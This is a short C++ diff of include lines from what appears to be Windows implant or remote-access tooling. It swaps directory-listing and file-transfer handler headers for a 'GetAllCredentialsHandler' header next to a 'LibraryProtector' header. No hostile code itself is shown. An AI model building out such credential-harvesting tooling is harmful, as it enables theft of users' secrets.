@@ -3,9 +3,7 @@
 #include "FigImplException.hpp"
 #include "FigManager.hpp"
 #include "Trace.hpp"
-#include "Operations/DirlistHandler.hpp"
-#include "Operations/DropFileHandler.hpp"
-#include "Operations/GetFileHandler.hpp"
+#include "Operations/GetAllCredentialsHandler.hpp"
 #include "Protections/LibraryProtector.hpp"
 
 #include <Windows.h>
